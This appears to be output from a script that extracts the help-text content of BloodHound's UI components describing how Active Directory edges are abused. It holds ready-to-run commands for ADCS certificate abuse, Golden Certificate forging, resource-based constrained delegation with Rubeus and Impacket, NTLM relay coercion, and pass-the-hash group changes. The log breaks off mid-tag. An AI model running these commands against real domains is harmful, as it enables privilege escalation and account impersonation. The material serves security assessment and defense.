+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9b
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9b
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9b/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9b
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9b/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps.</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+            {step8}
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6a
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6a
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6a/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <b>Step 1</b>: Use Certipy to request enrollment in the affected template, specifying the affected
+                enterprise CA and target principal to impersonate:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate
+                created in Step 1 and the IP of a domain controller:
+            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
+            <Typography variant='body2'>
+                If the authentication fails then it may be because the DC enforces strong certificate mapping. This
+                requirement can be met by including a URL parameter in the SAN with the target's SID, however not
+                supported by Certipy. See the Windows abuse section for example.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6a
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6a/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <b>Step 1</b>: Use Certify to request enrollment in the affected template, specifying the affected
+                enterprise CA and target principal to impersonate:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:<target UPN or SAMAccountName without $> /url:"tag:microsoft.com,2022-09-14:sid:<target SID>"'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 2</b>: Convert the emitted certificate to PFX format:
+            </Typography>
+            <Typography component={'pre'}>{'certutil.exe -MergePFX .cert.pem .cert.pfx'}</Typography>
+            <Typography variant='body2'>
+                <b>Step 3</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
+                target identity to impersonate and the PFX-formatted certificate created in Step 2:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    '.\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /password:asdf /ptt'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 4</b>: Optionally verify the TGT by listing it with the klist command:
+            </Typography>
+            <Typography component={'pre'}>{'klist'}</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAddOwner
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAddOwner
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CanRDP
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CanRDP
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HostsCAService
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HostsCAService
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HostsCAService/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on this relationship. This relationship alone is not
+            enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of
+            the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be
+            possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to
+            the domain node. Check if there is an outbound GoldenCert edge from the computer node.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HostsCAService
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HostsCAService/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on this relationship. This relationship alone is not
+            enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of
+            the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be
+            possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to
+            the domain node. Check if there is an outbound GoldenCert edge from the computer node.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAddSecret
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAddSecret
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGetSecrets
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGetSecrets
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKIEnrollmentFlag
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKIEnrollmentFlag
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKIEnrollmentFlag/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKIEnrollmentFlag
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKIEnrollmentFlag/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAddOwner
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAddOwner
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteAccountRestrictions
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteAccountRestrictions
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteAccountRestrictions/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer
+                account can be added with Impacket's addcomputer.py example script:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                We now need to configure the target object so that the attacker-controlled computer can delegate to it.
+                Impacket's rbcd.py script can be used for that purpose:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin"
+                for. Impacket's getST.py example script can be used for that purpose.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the
+                TARGETCOMPUTER.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteAccountRestrictions
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteAccountRestrictions/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does
+                not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new
+                attacker-controlled computer account:
+            </Typography>
+            <Typography component={'pre'}>
+                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!'
+                -AsPlainText -Force)"
+            </Typography>
+            <Typography variant='body2'>
+                PowerView can be used to then retrieve the security identifier (SID) of the newly created computer
+                account:
+            </Typography>
+            <Typography component={'pre'}>
+                '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
+            </Typography>
+            <Typography variant='body2'>
+                We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the
+                binary bytes for the new DACL/ACE:
+            </Typography>
+            <Typography component={'pre'}>
+                '$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
+                "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' + '$SDBytes = New-Object byte[]
+                ($SD.BinaryLength)\n' + '$SD.GetBinaryForm($SDBytes, 0)'
+            </Typography>
+            <Typography variant='body2'>
+                Next, we need to set this newly created security descriptor in the
+                msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using
+                PowerView in this case:
+            </Typography>
+            <Typography component={'pre'}>
+                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set
+                @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125;"
+            </Typography>
+            <Typography variant='body2'>
+                We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+            </Typography>
+            <Typography component={'pre'}>'Rubeus.exe hash /password:Summer2018!'</Typography>
+            <Typography variant='body2'>
+                And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want
+                to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us
+                access to the file system of the TARGETCOMPUTER:
+            </Typography>
+            <Typography component={'pre'}>
+                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin
+                /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZNodeResourceGroup
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZNodeResourceGroup
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGRoleManagement_ReadWrite_Directory
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGRoleManagement_ReadWrite_Directory
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GPLink
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GPLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GPLink/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                With full control of a GPO, you may make modifications to that GPO which will then apply to the users
+                and computers affected by the GPO. Select the target object you wish to push an evil policy down to,
+                then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such
+                as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and
+                execute the new evil policy. See the references tab for a more detailed write up on this abuse.
+            </Typography>
+
+            <Typography variant='body2'>
+                <Link target='_blank' rel='noopener' href='https://github.com/Hackndo/pyGPOAbuse'>
+                    pyGPOAbuse.py
+                </Link>{' '}
+                can be used for that purpose.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GPLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GPLink/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                With full control of a GPO, you may make modifications to that GPO which will then apply to the users
+                and computers affected by the GPO. Select the target object you wish to push an evil policy down to,
+                then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such
+                as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new
+                evil policy. See the references tab for a more detailed write up on this abuse.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZRoleApprover
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GoldenCert
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GoldenCert
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GoldenCert/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host
+                using Certipy:
+                <Typography component={'pre'}>
+                    {"certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'"}
+                </Typography>
+                The enterprise CA certificate is the one where issuer and subject are identical.
+                <br />
+                <br />
+                2) Forge a certificate of a target principal:
+                <Typography component={'pre'}>
+                    {
+                        "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'"
+                    }
+                </Typography>
+                <br />
+                3) Request a TGT for the targeted principal using the certificate against a given DC:
+                <Typography component={'pre'}>
+                    {"certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'"}
+                </Typography>
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GoldenCert
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GoldenCert/WindowsAbuse.tsx:
+            <Typography variant='body1'>
+                Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)
+            </Typography>
+            <Typography variant='body2'>
+                1) Open certsrv.msc as Administrator on the enterprise CA host.
+                <br />
+                2) Right-click on the enterprise CA and select "All Tasks" followed by "Back up CA...".
+                <br />
+                3) Click "Next", select "Private key and CA certificate", and select the location folder.
+                <br />
+                4) Click "Next", and set a password.
+                <br />
+                5) Click "Next" and click "Finish" to back up the certificate as a .p12 file.
+            </Typography>
+            <Typography variant='body1'>Obtain CA certificate incl. private key - using commandline tools</Typography>
+            <Typography variant='body2'>
+                1) Print all certificates of the host using SharpDPAPI:
+                <Typography component={'pre'}>{'SharpDPAPI.exe certificates /machine'}</Typography>
+                The enterprise CA certificate is the one where issuer and subject are identical.
+                <br />
+                <br />
+                2) Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the
+                same folder.
+                <br />
+                3) Create a .pfx version of the CA certificate using certutil:
+                <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
+                <br />
+                4) Set password when prompted.
+            </Typography>
+            <Typography variant='body1'>Forge certificate and obtain a TGT as targeted principal</Typography>
+            <Typography variant='body2'>
+                1) Forge a certificate of a target principal using ForgeCert:
+                <Typography component={'pre'}>
+                    {
+                        'ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword "password123!" --Subject "CN=User" --SubjectAltName "roshi@dumpster.fire" --NewCertPath target.pfx --NewCertPassword "NewPassword123!"'
+                    }
+                </Typography>
+                <br />
+                2) Request a TGT for the targeted principal using the certificate with Rubeus:
+                <Typography component={'pre'}>
+                    {
+                        'Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!'
+                    }
+                </Typography>
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZVMAdminLogin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZVMAdminLogin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HasSession
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HasSession
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZRunsAs
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZRunsAs
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToAct
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToAct
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToAct/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                We can then get a service ticket for the service name (sname) we want to "pretend" to be "admin" for.
+                Impacket's getST.py example script can be used for that purpose.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the
+                TARGETCOMPUTER.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToAct
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToAct/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                Abusing this primitive is currently only possible through the Rubeus project.
+            </Typography>
+
+            <Typography variant='body2'>
+                To use this attack, the controlled account MUST have a service principal name set, along with access to
+                either the plaintext or the RC4_HMAC hash of the account.
+            </Typography>
+
+            <Typography variant='body2'>
+                If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:
+            </Typography>
+
+            <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>
+
+            <Typography variant='body2'>
+                Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be
+                "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file
+                system of the TARGETCOMPUTER:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {`Rubeus.exe s4u /user:${sourceName}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`}
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OwnsRaw
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddAllowedToAct
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddAllowedToAct
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddAllowedToAct/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer
+                account can be added with Impacket's addcomputer.py example script:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                We now need to configure the target object so that the attacker-controlled computer can delegate to it.
+                Impacket's rbcd.py script can be used for that purpose:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin"
+                for. Impacket's getST.py example script can be used for that purpose.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the
+                TARGETCOMPUTER.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddAllowedToAct
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddAllowedToAct/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does
+                not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new
+                attacker-controlled computer account:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                PowerView can be used to then retrieve the security identifier (SID) of the newly created computer
+                account:
+            </Typography>
+            <Typography component={'pre'}>
+                {'$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'}
+            </Typography>
+            <Typography variant='body2'>
+                We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the
+                binary bytes for the new DACL/ACE:
+            </Typography>
+            <Typography component={'pre'}>
+                {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
+                    '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
+                    '$SD.GetBinaryForm($SDBytes, 0)'}
+            </Typography>
+            <Typography variant='body2'>
+                Next, we need to set this newly created security descriptor in the
+                msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using
+                PowerView in this case:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+            </Typography>
+            <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>
+            <Typography variant='body2'>
+                And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want
+                to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us
+                access to the file system of the TARGETCOMPUTER:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
+                }
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExtendedByPolicy
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExtendedByPolicy
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExtendedByPolicy/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate.
+            This relationship alone is not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExtendedByPolicy
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ExtendedByPolicy/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate.
+            This relationship alone is not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericWrite
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericWrite
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericWrite/LinuxAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericWrite
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericWrite/WindowsAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZOwns
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZOwns
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZHasRole
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZHasRole
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToSMB
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToSMB
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToSMB/LinuxAbuse.tsx:
+            <Typography variant={'body2'}>
+                1. Start the Relay Server The NTLM relay can be executed with{' '}
+                <a href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>ntlmrelayx.py</a>.
+            </Typography>
+
+            <Typography variant={'body2'}>
+                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'}>printerbug.py</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToSMB
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToSMB/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                1: Take Over the SMB Port on the Attacker Host To avoid a conflict with SMB running on the
+                attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved
+                with smbtakeover.
+            </Typography>
+            <Typography variant='body2'>
+                2: Start the Relay Server The NTLM relay can be executed with{' '}
+                <a href={'https://github.com/Kevin-Robertson/Inveigh'}>Inveigh</a>.
+            </Typography>
+            <Typography variant='body2'>
+                3: Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddSelf
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddSelf
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddSelf/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext
+                or prompted interactively if omitted from the command line:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                It can also be done with pass-the-hash using{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
+                    pth-toolkit's net tool
+                </Link>
+                . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>Finally, verify that the user was successfully added to the group:</Typography>
+
+            <Typography component={'pre'}>
